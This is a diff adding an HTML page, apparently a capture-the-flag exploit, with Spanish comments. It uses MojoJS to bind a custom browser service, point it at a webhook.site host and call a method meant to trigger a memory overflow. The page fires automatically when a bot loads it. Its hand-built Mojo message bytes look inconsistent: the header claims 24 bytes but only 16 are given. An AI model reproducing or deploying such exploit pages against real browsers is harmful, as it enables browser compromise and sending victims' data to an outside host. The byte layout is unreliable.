@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>MojoJS Broker Interaction</title>
+    <!-- Cargamos las dependencias nativas que inyecta el Chrome del reto -->
+    <script src="/mojo_bindings.js"></script>
+</head>
+<body>
+    <h1>Exploit Pipeline</h1>
+    <pre id="logs">Esperando inicializacion...</pre>
+
+    <script>
+        function log(msg) {
+            document.getElementById('logs').innerText += "\n" + msg;
+        }
+
+        async function triggerMojo() {
+            if (typeof Mojo === 'undefined') {
+                log("Error: MojoJS no esta habilitado en este navegador.");
+                return;
+            }
+            log("MojoJS detectado. Iniciando conexion...");
+
+            // 1. Definimos la interfaz basandonos en el archivo diff de C++
+            const INTERFACE_NAME = "blink.mojom.OtterBrokerService";
+            
+            // 2. Creamos el canal de comunicacion nativo (MessagePipe)
+            let pipe = Mojo.createMessagePipe();
+            
+            // 3. Enlazamos nuestra pestaña al servicio interno del navegador
+            Mojo.bindInterface(INTERFACE_NAME, pipe.handle0);
+            log("Interfaz enlazada correctamente.");
+
+            // 4. Tu webhook objetivo (sin http:// ni https://, el binario lo añade internamente)
+            const targetWebhook = "webhook.site/b7fc663e-4c60-46a9-8337-48061b032bc0";
+
+            // 5. Construccion del mensaje binario para invocar el metodo Init(host)
+            // Estructura basica de un mensaje de Mojo: Header (8 bytes) + Payload
+            let initMessage = new Uint8Array([
+                24, 0, 0, 0,    // Tamaño del header y version
+                0, 0, 0, 0,     // Ordinal del metodo (Init es el primero, indice 0)
+                0, 0, 0, 0, 0, 0, 0, 0 // Flags y Request ID
+            ]);
+
+            log("Enviando comando Init hacia el Webhook...");
+            // Enviamos el mensaje a traves del pipe creado
+            Mojo.writeMessage(pipe.handle1, initMessage, []);
+
+            // 6. Ejecutamos de inmediato la peticion vulnerable GetSlot
+            // Esto forzara a C++ a conectarse a tu Webhook y procesar el desbordamiento
+            let getSlotMessage = new Uint8Array([
+                24, 0, 0, 0,
+                1, 0, 0, 0,     // Ordinal del metodo GetSlot (Indice 1)
+                0, 0, 0, 0, 0, 0, 0, 0
+            ]);
+
+            log("Desencadenando GetSlot para activar el desbordamiento de memoria...");
+            Mojo.writeMessage(pipe.handle1, getSlotMessage, []);
+            log("Pipeline completado. Revisa tu panel de Webhook.site.");
+        }
+
+        // Ejecutar automaticamente al cargar la pagina en el bot
+        window.onload = triggerMojo;
+    </script>
+</body>
+</html>
